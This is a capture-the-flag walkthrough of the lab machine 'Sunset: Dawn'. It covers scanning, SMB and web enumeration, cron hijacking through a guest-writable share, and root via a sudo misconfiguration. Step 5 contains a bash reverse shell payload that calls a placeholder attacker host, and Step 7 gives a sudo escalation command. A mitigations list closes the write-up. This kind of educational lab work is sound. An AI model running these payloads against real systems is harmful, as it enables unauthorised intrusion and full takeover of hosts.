# Sunset: Dawn — Walkthrough

| Field | Detail |
|---|---|
| Machine | Sunset: Dawn |
| Series | Sunset |
| Author | whitecr0wz |
| OS | Linux |

## 🔍 Overview

Sunset: Dawn is a Linux machine involving an exposed process-monitoring log that leaked cron job details, a writable SMB share tied to a cron-executed script (leading to a `www-data` shell), and privilege escalation through a critical sudo misconfiguration allowing `www-data` to run `sudo` itself as root.

---

## Step 1 – Reconnaissance

**Host discovery:**

```bash
arp-scan -l
```

**Port scanning:**

```bash
nmap -sV -sC -T4 --top-ports 1000 192.168.1.165
```

**Open Ports:**

| Port | Service | Version |
|---|---|---|
| 80 | HTTP | Apache 2.4.38 (Debian) |
| 139/445 | SMB (Samba) | 4.9.5-Debian |
| 3306 | MySQL/MariaDB | 5.5.5-10.3.15 |

`smb-security-mode` output indicated guest SMB access was likely allowed.

---

## Step 2 – Web Enumeration

```bash
curl -s http://192.168.1.165/
```

Homepage was a placeholder "under construction" page for a fictional company, hinting at additional features that weren't directly guessable as paths.

**Directory brute-forcing:**

```bash
gobuster dir -u http://192.168.1.165 -w /usr/share/wordlists/dirb/common.txt -t 50
```

**Found:** `/logs` directory with directory listing enabled, containing several log files. Most were restricted (403), except for a freshly modified **`management.log`**.

---

## Step 3 – SMB Enumeration

```bash
smbclient -L //192.168.1.165/ -N
```

**Shares found:** `print$`, `ITDEPT` (with a warning banner not to remove it), and `IPC$`.

```bash
smbclient //192.168.1.165/ITDEPT -N
```

The `ITDEPT` share appeared empty on listing, but testing confirmed **guest write access was available** — a critical finding for later exploitation.

---

## Step 4 – Process Monitoring Log Analysis

```bash
wget http://192.168.1.165/logs/management.log
cat management.log
```

The log was being generated live by `pspy64` (a process-monitoring tool) running as root, and revealed a recurring cron job executing scripts located in `/home/dawn/ITDEPT/` — the same directory backing the writable `ITDEPT` SMB share — as both `www-data` and `dawn` users, with permissions being reset via `chmod 777` each run.

---

## Step 5 – Exploiting the Writable Cron Script

Since the `ITDEPT` share mapped directly to the directory being executed by cron, and guest write access was available, the cron-executed script could be overwritten with a malicious payload.

**Set up a listener:**

```bash
nc -lvnp 4444
```

**Create a reverse shell payload:**

```bash
cat << 'EOF' > /root/web-control
#!/bin/bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
EOF
chmod +x /root/web-control
```

**Overwrite the cron-executed script via SMB:**

```bash
smbclient //192.168.1.165/ITDEPT -N -c "put /root/web-control web-control"
```

**Result:** The cron job executed the payload automatically, returning a reverse shell as `www-data`.

---

## Step 6 – Stabilizing the Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Step 7 – Privilege Escalation to Root

```bash
sudo -l
```

**Result:**

```
User www-data may run the following commands on dawn:
    (root) NOPASSWD: /usr/bin/sudo
```

`www-data` could run `/usr/bin/sudo` itself as root with no password — a critical misconfiguration, since `sudo` can then be used to invoke any other command as root.

**Exploited the misconfiguration:**

```bash
sudo /usr/bin/sudo /bin/bash
```

**Result:** Full root shell obtained.

---

## Step 8 – Flag Capture

```bash
id
cd /root
ls
cat flag.txt
```

**Confirmed:** `uid=0(root) gid=0(root)` — full root access.

✅ **Root flag captured — machine fully compromised.**

---

## 🛡️ Key Vulnerabilities Identified

1. A process-monitoring log (`pspy64` output) was publicly exposed via the web server, leaking cron job details and internal script paths
2. Guest SMB write access was enabled on a share tied to a cron-executed script location
3. A cron job repeatedly executed scripts from a share-writable directory, allowing arbitrary code execution
4. A critical sudo misconfiguration granted `www-data` NOPASSWD access to `/usr/bin/sudo` itself — effectively equivalent to unrestricted root access

## 🩹 Mitigations

1. Never expose process-monitoring or diagnostic logs via a public web server
2. Disable guest/anonymous SMB access unless explicitly required
3. Never allow cron jobs to execute scripts from world- or guest-writable locations
4. Never grant NOPASSWD sudo access to `sudo` itself, or to any binary that can be used to invoke arbitrary commands
5. Regularly audit sudoers configurations and cron job script permissions
6. Apply the principle of least privilege throughout the system

---

## 🧰 Tools Used

`arp-scan` · `nmap` · `gobuster` · `smbclient` · `netcat` · `python (pty)` · `pspy64` (identified via log analysis)

## 🧠 Techniques Covered

Network scanning · Web enumeration · Exposed log analysis · SMB share enumeration · Cron job hijacking via writable share · Reverse shell handling · Sudo misconfiguration exploitation

---

## Summary

| Step | Description | Status |
|---|---|---|
| 1 | Reconnaissance | ✅ |
| 2 | Web Enumeration | ✅ |
| 3 | SMB Enumeration | ✅ |
| 4 | Process Monitoring Log Analysis | ✅ |
| 5 | Exploiting the Writable Cron Script | ✅ |
| 6 | Stabilizing the Shell | ✅ |
| 7 | Privilege Escalation to Root | ✅ |
| 8 | Flag Capture | ✅ |

*Writeup for educational purposes. Machine solved as part of the "Sunset" series.*
